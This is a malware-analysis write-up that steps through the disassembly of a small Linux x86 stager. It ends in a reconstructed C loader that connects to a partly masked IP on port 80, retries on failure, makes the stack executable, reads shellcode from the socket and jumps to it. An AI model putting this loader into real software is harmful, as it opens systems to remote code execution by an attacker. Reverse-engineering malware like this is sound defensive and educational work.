### Entry point

![Figure 1: loop counter](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%201.png)

Figure 1: loop counter

 In figure 1, the first instruction `push  0Ah` will push the value **“10”** on the stack and the next instruction will pop it and put the value **“10”** in *****esi register*. The *esi* register is used as a counter in loop.  This will be discussed later along with Figure 12.

![                         Figure 2:  Two syscalls for socket and  connect functions in c.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%202.png)

![Figure 3: socketcall syscall](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%203.png)

Figure 3: socketcall syscall





In figure 2, the instruction `int  80h` is an interrupt for executing a syscall. This instruction uses the eax register for the syscall number. The other registers used by this instruction are *ebx*, *ecx*, *edx* etc. for arguments to the syscall.

In the first syscall (`int 80h`), the value of “al” register is set to **66h** or **102** by ****calling `mov al, 66h` . The syscall number 102 represents the syscall “socketcall”. This syscall takes two arguments, which means it will use the *ebx* register for the first argument and *ecx* for the second refer to figure 3,4. 

 

![Figure 4: socketcall synopsis  [https://man7.org/linux/man-pages/man2/socketcall.2.html](https://man7.org/linux/man-pages/man2/socketcall.2.html)](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%204.png)

### Call to “socket” function via socketcall syscall

```wasm
loc_8048057:
xor     ebx, ebx
mul     ebx
push    ebx
inc     ebx             ; call
push    ebx
push    2
mov     al, 66h ; 'f'
mov     ecx, esp        ; args
**int     80h**
```

- The first instruction `xor` will set the *ebx* register to zero.
- Since *ebx* is zero, the `mul` instruction will have no effect on *ebx*.
- The third instruction `push ebx` will push the value 0 on top of the stack.
- `inc ebx` will increment the value of *ebx* by one, so now the *ebx* value is **1**.
- The fifth instruction `push ebx` will push the value 1 on top of the stack.
- `push 2` will push the value 2 on top of the stack.

At this point, the stack looks like this:

![Figure 5: The stack after operation ](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%205.png)

Figure 5: The stack after operation 

- `mov al, 66h` will move the value 102 to the al register. This value represents the syscall “socketcall”,.
- `mov ecx, esp` will mov the address in esp to the *ecx* register.
- `int 80h` will execute the syscall.

Since the syscall here is “socketcall”. The first argument of the syscall uses the *ebx* register, and the value of *ebx* is **1**. In this case, the C function “socket” will be called. Depending on the value of *ebx*, the syscall “socketcall” will call the corresponding C function, for instance, if the value of ebx was **2**, then the “bind” function will be called, refer to figure 4.

The *ecx* register holds the value for the second argument.  As the first argument represents the C function to call, the second argument is a pointer to the parameters for the C function. For instance, the “socket” function takes three parameters, and these three parameters are located on the stack refer to Figure 6. 

This is the reason why `mov ecx, esp` instruction is executed, it moves the *esp* value to the *ecx* register as esp is pointing to the first parameter of “socket” function in stack, refer to Figure 5. By looking at the stack, it is evident, the first parameter (domain) for the “socket” is **2**, which means **AF_INET** (ipv4 addresses)**,** the second parameter (type) is **1**, which means **SOCK_STREAM** (TCP socket), and the third parameter (protocol) is **0**, which means let the service provider decide which protocol to use for the socket.

The compiler-generated syscall was actually written like this in C:


```c
int s = socket(AF_INET, SOCK_STREAM, 0);
```

![Figure 6: The synopsis for the socket function. ](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%206.png)

### Call to “connect” function via socketcall syscall

```wasm
**int     80h**
xchg    eax, edi
pop     ebx
push    2E9D1C95h
push    50000002h
mov     ecx, esp
push    66h ; 'f'
pop     eax
push    eax
push    ecx
push    edi
mov     ecx, esp
inc     ebx
**int     80h**
test    eax, eax
jns     short loc_804809C
```

- When the the first syscall `int  80h` returns, the result will be saved in the *eax *****register. Since it calls the C function “socket”, the result is the socket.
- The second instruction `xchg  eax, edi` will swap the value of *eax* with the *edi *****register because the *eax* register is needed for the syscall number in second syscall `int 80h` . Now, the *edi *****register will hold the socket.
- In Figure 5, the *ESP* register is pointing to the value **2**, so the `pop  ebx` will load the value **2** from top of the stack to the *ebx* register and increment the stack pointer by 4, so now the *ESP* register will point to the value **1** on the stack. It is important to note, the *ebx* register will hold the first argument for the syscall.
- `push 2E9D1C95h` and `push 50000002h` together will push 8 bytes on the top of stack. The pushed values look like constants, it is actually an object that will be used by the syscall.
- In the previous instructions, the object was pushed on the stack, so the *ESP* register points to the object now. The `mov ecx, esp` instruction will move the address of the object from ESP to *ecx*. As the *ebx* register will hold the first argument, similarly the *ecx* register will hold the second argument for the syscall.
- `push    66h` will push the value `102` on top of the stack (decrements the value of *ESP* by 4) and the next instruction `pop eax` will load this value to *eax* and increment the *ESP* register by 4. refer to Figure 7. The value of *eax* register is now **102**, and this is a syscall number meaning “socketcall”, which will call a C function depending on the value in the *ebx* register.

At this point, the stack looks like this:

![Figure 7: The stack after pushing the object](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%207.png)

Figure 7: The stack after pushing the object
---

- The three push instructions `push eax` , `push ecx` , and `push edi` will push a total of 12 bytes together on the stack. These 12 bytes are the parameters that will be used by the syscall. The value of *eax* is **102**, the value of *ecx* is an address, and it is pointing to the object `0x50000002` on the stack. The value of *edi* is the socket from the previous syscall.

The stack will now look like this Figure 8: 

![Figure 8: The complete stack for the second syscall.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%208.png)

Figure 8: The complete stack for the second syscall.

---

- `mov ecx, esp` will move the address in ESP to *ecx*. The *ecx* register will now point to the top of the stack, and that’s where the parameters are located.
- `inc ebx` will increment the vlaue of *ebx*. The value of *ebx* is now **3**.
- `int 80h` will execute the syscall “socketcall” since the value of *eax* is **102**. Just like the previous syscall, which was also “socketcall”, the *ebx* register is used for the first argument and *ecx* for the second. Since the value of *ebx* is **3**, the C function “connect” will be called by the syscall. A pointer to the parameters is stored in the *ecx* register.

In Figure 8, the parameters for the C “connect” function are shown. The first parameter is the socket, the second is a pointer to an object of type **sockaddr_in**, the third parameter is the length of the object “sockaddr_in” from second parameter, refer to Figure 9. 

![Figure 9: synopsis of connect function](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%209.png)

Figure 9: synopsis of connect function

Although, the length (third parameter) is **102** in stack, but in reality, it’s 8 bytes. By looking at the pointer in second parameter, it is pointing to an object on stack as shown in Figure 8. The size of the object is 8 bytes. The type of this object is **sockaddr_in**.

```c
struct sockaddr_in {
short            sin_family;   // e.g. AF_INET
unsigned short   sin_port;     // e.g. htons(3490)
struct in_addr   sin_addr;     // see struct in_addr, below
};

struct in_addr {
unsigned long s_addr;  // load with inet_aton()
};
```

There are two constants on the stack: `0x50000002` and `0x2E9D1C95` 

 These two constants together make up the object. `sin_family` and `sin_port` are both 2 bytes in size, together they are 4 bytes in size. This means they are packed together in the constant `0x50000002` . It will make more sense when shown in binary, refer to Figure 10.

![Figure 10: sin_family and sin_port members of sockaddr_in struct ](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%2010.png)

Figure 10: sin_family and sin_port members of sockaddr_in struct 

Moreover,  the member *sin_family* is *0x2 **(AF_INET*)** while *sin_port* is *0x5000*. The constant `0x2E9D1C95` is the member `sin_addr` which is 4 bytes in size. The host ip and port can be fetched from this object data, refer to Figure 11. The port of the host is **80** and the ip is **149.28.xxx.xxx,** while this looks a network ID, it was mentioned in the source code of the binary.

![Figure 11: host IP and port decrypted](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%2011.png)

Figure 11: host IP and port decrypted

---

In C code, the call to connect function may look like this:

```c
sockaddr_in serverAddress;
serverAddress.sin_family = AF_INET;
serverAddress.sin_port = htons(80);

if (inet_pton(AF_INET, "149.28.xxx.xxx", &serverAddress.sin_addr) <= 0) {
    printf(
    "\nInvalid address/ Address not supported \n");
    return -1;
}

connect(s, (struct sockaddr*)&serverAddress, sizeof(serverAddress));
```


---

### Loop counter

![Figure 12: Code after calling “connect” function via socketcall syscall.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%2012.png)

Figure 12: Code after calling “connect” function via socketcall syscall.

In Figure 12, the result of the socketcall syscall is stored in the *eax* register. There are two instructions after `int 80h` to check the result.

```wasm
int     80h
test    eax, eax
jns     short loc_804809C
```

In C code, it looked like this:

```c
if(connect(s, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
    // dec     esi
    // jz      short loc_80480C
}
// loc_804809C code here
```

It’s checking for failure of “connect” function. There’s a good chance it will try to connect again on failure since that’s a very common thing to do when connecting to host fails.

The instruction `dec esi` will decrement the counter. The esi register holds a value that acts as a counter or the maximum number of “tries” to connect to host on failure, refer to Figure 1. After each try, the esi register is decremented and when it becomes zero, the exit function is called. 

```c
if(connect(s, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
    tries--;
    if (tries == 0) {
        exit(1);
    }
    // call nanosleep here
}
// loc_804809C code 
```

---

### Call to nanosleep function

![Figure 13: nanosleep, mprotect, and read syscalls](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%2013.png)

Figure 13: nanosleep, mprotect, and read syscalls

If the esi register is not zero, the control jumps to “nanosleep” syscall, refer to Figure 13.

```wasm
push    0A2h
pop     eax
push    0
push    5
mov     ebx, esp        ; req
xor     ecx, ecx        ; rem
int     80h             ; LINUX - sys_nanosleep
test    eax, eax
jns     short loc_8048057
```

- `push 0xA2` will push the value **162** on the stack and then next instruction will pop it and load the value into *eax* register. The *eax* register holds the syscall number and **162** is the syscall number for “nanosleep”.
- The two push instructions will push the values **0** and **5** on stack. These two values together make up an object and the size of the objet is 8 bytes.
- `mov ebx, esp` will  move the address in esp to *ebx*. Now *ebx* will point to the object that was pushed on the stack (values 0 and 5).
- `xor ecx, ecx` will set the ecx register to zero.
- `int 80h` will execute the “nanosleep” syscall. The first argument is in *ebx* (pointer to timespec object), the second argument (null a.k.a zero) is in ecx, refer to Figure 14.
- `test eax, eax` will check the result of the function and jump to exit function if it’s negative. If it’s not negative, then it will jump to `loc_8048057` , which is basically the first function call in code, refer to Figure 2.

![Figure 14: Synopsis of nanosleep function. ](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%2014.png)

Figure 14: Synopsis of nanosleep function. 

So far, the code looks like this:

```c
int main() {
    int tries = 10;
    while (true) {
        int s = socket(AF_INET, SOCK_STREAM, 0); 

        sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(80);

        if (inet_pton(AF_INET, "149.28.xxx.xxx", &serverAddress.sin_addr) <= 0) {
            printf(
                "\nInvalid address/ Address not supported \n");
            return -1;
        }
        if(connect(s, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
            tries--;
            if (tries == 0) {
                exit(1);
            }
            timespec t;
            t.tv_sec = 5;
            t.tv_nsec = 0;
            if (nanosleep(&t, NULL) < 0)
                exit(1);
            else 
                continue; // retry
        }
        // loc_804809C code
    }
}
```

If the *connect* function succeeds, the control jumps to **loc_804809C,** which is a syscall to *mprotect* function.

---

### Call to mprotect function

```wasm
loc_804809C:
mov     dl, 7
mov     ecx, 1000h
mov     ebx, esp
shr     ebx, 0Ch
shl     ebx, 0Ch
mov     al, 7Dh ; '}'
int     80h             ; 125 = sys_mprotect
test    eax, eax
js      short loc_80480C3
```

- `mov  dl, 7` will move the value **7** to edx. The edx register will hold the third argument for the syscall. This argument is used as flags for *mprotect* function. Here, the value **7** means `PROT_EXEC | PROT_READ | PROT_WRITE`
- `mov ecx, 1000h` will move the value **4096** to the ecx register. The ecx register will hold the second argument for the syscall. This argument is used for size, i.e., the number bytes to change protection for.
- `mov ebx, esp` will move the address in esp register to *ebx*. This argument is the address where the memory protection should be changed. This is a very strange behavior, instead of alllocating more space, it tries change memory protection in the stack. This means it will store a shellcode in the stack since there is `PROT_EXEC` flag in the third argument (edx register).
- `shr ebx, 0Ch` and `shl ebx, 0Ch` will simply align the address by 4096. If *ebx* is pointing somewhere in the memory page, it will now point to the top of the page.
- `mov al, 7Dh` will move the syscall number **125** into *eax*. This is for *mprotect* syscall.
- `int 80h` will execute the *mprotect* syscall and put the result in the *eax* register.

![Figure 15: Synopsis of mprotect function.](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%2015.png)

Figure 15: Synopsis of mprotect function.

The call to *mprotect* may look like this:

```c
int hamad = mprotect(&s, 4096, PROT_EXEC | PROT_READ | PROT_WRITE);
if(hamad >= 0)
    exit(1);
```

The address of variable `s` (socket) is passed in the first argument because it is the top of the stack in C  code. The malware author could’ve created space for a buffer on the stack but chose not to.  The next step for the malware is to put the shellcode on stack and execute it.

---

### Call to read function

```wasm
pop     ebx
mov     ecx, esp
cdq
mov     dl, 6Ah ; 'j'
mov     al, 3
int     80h             ; 3 = sys_read
test    eax, eax
js      short loc_80480C3
jmp     ecx
```

- `pop ebx` will pop the last pushed value on the stack and store it in *ebx*. In this case, it is the stocket (variable `s` from code examples).
- `mov ecx, esp` will move the address in esp to ecx. This is for the second argument for output.
- `cdq` will copy the sign bit, i.e., the last bit of *eax* register to edx. This sign bit here will be 0 because *eax* is 0.
- `mov dl, 6Ah` The edx register will hold **106** value for the buffer size, and this is the third argument.
- `mov al, 3` will move the syscall number **3** (read) into *eax*.
- `int 80h` will execute the read syscall and put the result in *eax*. Since the first argument (*ebx*) is the socket, this means it is reading from the socket.

![Figure 16: Synopsis of read function](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/Tmp_txt/Untitled%2016.png)

Figure 16: Synopsis of read function

The call to read function might have looked like this:

```c
char buffer[106];
ssize_t nbytes_read = read(s, buffer, 106);
if (nbytes_read < 0)
    exit(1);
```
---

### Execution of shellcode

The next instruction after read syscall is `jmp ecx` . This jump might have been placed using inline assembly. It’s quite possible, the entire code might have been written in assembly since the code size is quite small. This jump is jumping to the location where the shellcode was loaded using *read* function.

In C, it may look like this:

```c
__asm__("jmp %0" :: "m" (buffer)); 
```
---

### Putting all of the code together:

```c
int main() {
    int tries = 10;
    while (true) {
        int s = socket(AF_INET, SOCK_STREAM, 0); 

        sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(80);

        if (inet_pton(AF_INET, "149.28.xxx.xxx", &serverAddress.sin_addr) <= 0) {
            printf(
                "\nInvalid address/ Address not supported \n");
            return -1;
        }
        if(connect(s, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
            tries--;
            if (tries == 0) {
                exit(1);
            }
            timespec t;
            t.tv_sec = 5;
            t.tv_nsec = 0;
            if (nanosleep(&t, NULL) < 0)
                exit(1);
            else 
                continue; // retry
        }

        int hamad = mprotect(&s, 4096, PROT_EXEC | PROT_READ | PROT_WRITE);
        if(hamad >= 0)
            exit(1);

        char buffer[106];
        ssize_t nbytes_read = read(s, buffer, 106);
        if (nbytes_read < 0)
            exit(1);

        __asm__("jmp %0" :: "m" (buffer)); // execute the shellcode in `buffer`
    }
}
```
